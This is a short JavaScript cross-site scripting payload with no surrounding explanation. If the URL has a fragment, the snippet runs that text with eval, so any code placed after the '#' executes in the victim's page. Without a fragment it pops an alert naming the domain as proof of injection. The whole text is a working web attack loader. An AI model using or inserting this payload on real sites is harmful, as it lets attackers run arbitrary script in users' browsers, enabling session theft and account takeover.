if (location.hash) {
  eval(location.hash.slice(1));
} else {
  alert("XSS in " + document.domain);
}
